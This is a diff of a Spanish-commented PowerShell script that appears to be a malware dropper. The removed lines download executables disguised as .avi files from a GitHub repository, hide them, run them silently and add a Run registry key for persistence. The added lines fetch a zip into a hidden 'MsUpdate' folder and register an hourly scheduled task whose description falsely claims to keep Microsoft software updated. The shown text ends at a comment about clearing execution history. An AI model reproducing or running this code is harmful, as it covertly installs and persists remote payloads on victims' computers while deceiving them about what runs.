@@ -1,57 +1,27 @@
-## Create directory
-$ErrorActionPreference = 'SilentlyContinue'
-$UserProfile = [System.Environment]::GetFolderPath("UserProfile")
-$MsRdpNetPath = Join-Path $UserProfile "AppData\Local\Microsoft\MsUpdate"
-if (-not (Test-Path -Path $MsRdpNetPath)) {
-    $MsRdpNetFolder = New-Item -Path $MsRdpNetPath -ItemType Directory -Force 
-    $MsRdpNetFolder.Attributes += "Hidden"
+$url = "https://github.com/emakedie/UCN/raw/refs/heads/main/Mscn.zip"
+$destinationFolder = "C:\Users\candrade\AppData\Local\Microsoft\MsUpdate"
+$zipFile = Join-Path -Path $destinationFolder -ChildPath "Mscn.zip"
+
+# Crear la carpeta de destino
+if (-not (Test-Path -Path $destinationFolder)) {
+    New-Item -ItemType Directory -Path $destinationFolder -Force | Out-Null
+    (Get-Item $destinationFolder).Attributes = "Hidden"
 }
+Invoke-WebRequest -Uri $url -OutFile $zipFile -ErrorAction SilentlyContinue
+Expand-Archive -Path $zipFile -DestinationPath $destinationFolder -Force -ErrorAction SilentlyContinue
+    Get-ChildItem -Path $destinationFolder -Recurse | ForEach-Object {
+        $_.Attributes = "Hidden"
+    }
+Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
 
-# Copy Agent
-$rutaLocalAgent = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\DocUp.exe"
-$urlRemotoAgent = "https://github.com/emakedie/UCN/raw/refs/heads/main/RegUpdate.avi"
-if (-not (Test-Path $rutaLocalAgent)) {
-    Invoke-WebRequest -Uri $urlRemotoAgent -OutFile $rutaLocalAgent
-}
-if ((Get-Item $rutaLocalAgent).Name -ne "DocUp.exe") {
-    $rutaNuevoNombreAgent = $rutaLocalAgent -replace 'RegUpdate.avi', 'DocUp.exe'
-    Rename-Item -Path $rutaLocalAgent -NewName $rutaNuevoNombreAgent
-}
-$atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.FileAttributes]::Hidden
-Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent
+Unregister-ScheduledTask -TaskName "MscnSrvUpdate" -Confirm:$false -ErrorAction SilentlyContinue
 
-# Copy Runer
-$rutaLocalRuner = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\CNUpdate.exe"
-$urlRemotoRuner = "https://github.com/emakedie/UCN/raw/refs/heads/main/CNUpdate.avi"
-if (-not (Test-Path $rutaLocalRuner)) {
-    Invoke-WebRequest -Uri $urlRemotoRuner -OutFile $rutaLocalRuner
-}
-if ((Get-Item $rutaLocalRuner).Name -ne "CNUpdate.exe") {
-    $rutaNuevoNombreRuner = $rutaLocalRuner -replace 'CNUpdate.avi', 'CNUpdate.exe'
-    Rename-Item -Path $rutaLocalRuner -NewName $rutaNuevoNombreRuner
-}
-$atributosOcultosRuner = (Get-Item $rutaLocalRuner).Attributes -bor [System.IO.FileAttributes]::Hidden
-Set-ItemProperty -Path $rutaLocalRuner -Name Attributes -Value $atributosOcultosRuner
-sleep 10
+$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "C:\Users\candrade\AppData\Local\Microsoft\MsUpdate\Mscntask.vbs"
+$trigger = New-ScheduledTaskTrigger -Once -At "00:00AM" -RepetitionInterval (New-TimeSpan -Minutes 60) -RepetitionDuration (New-TimeSpan -Days 365)
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MscnSrvUpdate" -Description "Mantiene actualizado el software de Microsoft. Si esta tarea está deshabilitada o detenida, el software de Microsoft no se actualizará, lo que significa que no se podrán corregir las vulnerabilidades que puedan surgir y es posible que las características no funcionen. Esta tarea se desinstalará cuando el software de Microsoft no la esté usando." -Settings $settings | Out-Null
 
-
-## Execution of the client
-Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\CNUpdate.exe" -ArgumentList "Documento.doc" -WindowStyle Hidden
-
-sleep 30
-
-# Ruta del registro para las entradas de inicio
-$rutaRegistro = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$nombreEntrada = "MsUpdate"
-
-# Verificar si la entrada ya existe
-if (-not (Test-Path "$rutaRegistro\$nombreEntrada")) {
-    # Ruta del ejecutable y el parámetro (Documento.doc)
-    $valorEntrada = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\CNUpdate.exe `"$env:UserProfile\Documents\Documento.doc`""
-    
-    # Crear la entrada en el registro
-    $null = New-ItemProperty -Path $rutaRegistro -Name $nombreEntrada -Value $valorEntrada -PropertyType String -Force
-}
+Start-ScheduledTask -TaskName "MscnSrvUpdate"
 
 
 # Limpiar historial de ejecucion
